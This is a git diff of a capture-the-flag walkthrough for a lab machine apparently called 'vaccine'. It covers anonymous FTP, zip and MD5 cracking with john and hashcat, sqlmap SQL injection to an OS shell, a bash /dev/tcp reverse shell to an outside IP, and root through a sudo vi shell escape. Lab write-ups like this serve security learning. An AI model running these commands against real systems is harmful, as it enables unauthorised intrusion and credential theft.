@@ -6,11 +6,10 @@
 #postgres
 #php 
 #hashcrack
-#euid
-#privescalation
+
 
 ### Reconnaissance
-`nmap -p-  $TARGET`
+The recon phase involves gathering information about the target to identify potential vulnerabilities. In this case, we used the Nmap command `nmap -p- $TARGET` to perform a port scan of the target IP address. The output shows that the host is up and running. The open ports include port 80(HTTP), port 22(SSH) and port 21(FTP). 
 
 ```
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-22 18:32 CET
@@ -22,10 +21,8 @@ PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
 ```
-
-
-`ftp $TARGET` username: anonymous   no passwd
-
+### FTP Service
+We start by checking if we can get some data by accessing the FTP service with the default account that doesn't need password, to do this we run `ftp $TARGET` with username `anonymous`  and no need of any password
 ```
 ftp> ls
 200 PORT command successful. Consider using PASV.
@@ -39,7 +36,11 @@ local: backup.zip remote: backup.zip
 226 Transfer complete.
 2533 bytes received in 0.00 secs (5.8209 MB/s)
 ```
-`unzip backup.zip`
+
+We find a zip called backup, so we download it.
+
+### Cracking the zip and the password
+If we try to unzip it by running `unzip backup.zip` we realize that this zip requires a password to be unzipped. As we dont have any kind of password we try to open it with bruteforce attack, to do this first we convert the zip so a tool like john the ripper is able to bruteforce it, to this we run `zip2john backup.zip > hashes`.
 ```
 Archive:  backup.zip
 [backup.zip] index.php password: 
@@ -47,8 +48,6 @@ Archive:  backup.zip
    skipping: style.css               incorrect password
 
 ```
-
-`zip2john backup.zip > hashes`
 ```
 ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06
 ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: 2b chk, TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A
@@ -56,8 +55,7 @@ NOTE: It is assumed that all files in each archive have the same password.
 If that is not the case, the hash may be uncrackable. To avoid this, use
 option -o to pick a file at a time.
 ```
-`john -w=/usr/share/wordlists/rockyou.txt hashes`
-
+Now that we have the zip in a acceptable format for the tool we can start the bruteforce with `john -w=/usr/share/wordlists/rockyou.txt hashes`
 ```
 sing default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
@@ -68,7 +66,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
-passwd = 741852963
+The zip password is `741852963`, now we can finally unzip it.
 `unzip backup.zip`
 ```
 Archive:  backup.zip
@@ -76,9 +74,7 @@ Archive:  backup.zip
   inflating: index.php               
   inflating: style.css
 ```
-
-`cat index.php`
-
+If there is something interesting in this files it will probably be inside the PHP code so we check it with `cat index.php`
 ```
 <!DOCTYPE html>
 <?php
@@ -133,10 +129,9 @@ session_start();
 </body>
 </html>
 ```
+As we found a hashed password `2cb42f8734ea607eefed3b70af13bbd3` we check it first with `hashid 2cb42f8734ea607eefed3b70af13bbd3` and after we can try to bruteforce it as done before with the zip with `echo '2cb42f8734ea607eefed3b70af13bbd3' > hash`
+`hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt`
 
-hashed passwd =2cb42f8734ea607eefed3b70af13bbd3
-
-`hashid 2cb42f8734ea607eefed3b70af13bbd3`
 
 ```
 Analyzing '2cb42f8734ea607eefed3b70af13bbd3'
@@ -159,10 +154,6 @@ Analyzing '2cb42f8734ea607eefed3b70af13bbd3'
 [+] DNSSEC(NSEC3) 
 [+] RAdmin v2.x
 ```
-
-`echo '2cb42f8734ea607eefed3b70af13bbd3' > hash`
-`hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt`
-
 ```
 Dictionary cache built:
 * Filename..: /usr/share/wordlists/rockyou.txt
@@ -192,28 +183,15 @@ Candidates.#1....: Dominic1 -> birth
 Started: Wed Nov 22 18:44:24 2023
 Stopped: Wed Nov 22 18:44:57 2023
 ```
+The original password is `qwerty789`
+### Web Application Analysis
+We access the website with http://10.129.175.136/, now we can access http://10.129.175.136/dashboard.php, once in we find a catalogue, so we try to perform a query. After performing the query the URL looks like `http://10.129.175.136/dashboard.php?search=some`, so it looks like we can perform a SQL Injection
 
-passwd = qwerty789
+First of all we need to gran our session cookie, to do this we can use the advanced tools of the web-browser we are currently using.
 
-http://10.129.175.136/
+`PHPSESSID=thfcev7fbaca5v0bo0oe7rhljp`
 
-->
-
-http://10.129.175.136/dashboard.php
-
-we have a catalogue we try query some
-
-the url looks like `http://10.129.175.136/dashboard.php?search=some`
-
-
-we can do a sql injection
-
-first we grab the session cookie with the web-browser advanced tools
-
-PHPSESSID=thfcev7fbaca5v0bo0oe7rhljp
-
-`sqlmap -u 'http://10.129.175.136/dashboard.php?search=*' --cookie PHPSESSID=thfcev7fbaca5v0bo0oe7rhljp --os-shell`
-
+Once we have the cookie we can perform a SQLI, we only need to mark to the tool where can it try to perform the injection by adding a `*` in this part of the URL, we also have to use the cookie we just extracted before. The final command looks like this `sqlmap -u 'http://10.129.175.136/dashboard.php?search=*' --cookie PHPSESSID=thfcev7fbaca5v0bo0oe7rhljp --os-shell`
 ```
        ___
        __H__
@@ -285,22 +263,13 @@ back-end DBMS: PostgreSQL
 [19:23:25] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
 os-shell>
 ```
+As we have a shell we can set a reverse shell, so as usual we set first the listener in the local machine with `sudo nc -lvnp 443` and right after it we can launch the reverse shell `bash -c "bash -i >& /dev/tcp/10.10.15.208/443 0>&1"`
+Once in the reverse shell we can upgrade it with `python3 -c 'import pty;pty.spawn("/bin/bash")'`
 
-`sudo nc -lvnp 443`
-we can launch a reverse shell `bash -c "bash -i >& /dev/tcp/10.10.15.208/443 0>&1"`
+The user flag can be found in `/var/lib/postgresql/user.txt`
+### Privilege escalation
 
-upgrade the shell
-
-```
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-```
-
-we can find the user flag in `/var/lib/postgresql/user.txt`
-
-we check `/var/www/html` contents in search of creds
-
-`cat dashboard.php`
-
+We check the contents of `/var/www/html` searching for any kind of credentials we can use, to do this `cat dashboard.php`
 ```
 <!DOCTYPE html>
 <html lang="en" >
@@ -405,10 +374,7 @@ we check `/var/www/html` contents in search of creds
 </body>
 </html>
 ```
-
-passwd = P@s5w0rd!
-
-`sudo -l`
+We get the password of the current user, which is `P@s5w0rd!` now we can run `sudo -l` to test if we have permissions to run any command as root.
 ```
 [sudo] password for postgres: P@s5w0rd!
 
@@ -421,22 +387,17 @@ Matching Defaults entries for postgres on vaccine:
 User postgres may run the following commands on vaccine:
     (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
 ```
-
-`sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf -c ':!/bin/sh' /dev/null`
-
+As we have permissions to run `vi` we check [GTFBins](https://gtfobins.github.io/gtfobins/vi/) to see if we can use this to get a root terminal.
+There are 2 ways of using `vi` to gain privileges so we try both of them, `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf -c ':!/bin/sh' /dev/null`
 ```
 [sudo] password for postgres: 
 Sorry, user postgres is not allowed to execute '/bin/vi /etc/postgresql/11/main/pg_hba.conf -c :!/bin/sh' as root on vaccine.
 ```
-
-`sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`
-
-using vi commands
+The first one didn't work but we still try the second one `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`
+Using vi commands:
 ```
 :set shell=/bin/sh
 :shell
 ```
 
-now we have a root term
-
-the flag is in `/root/root.txt`
+Finally we have a root terminal, the flag is in `/root/root.txt`
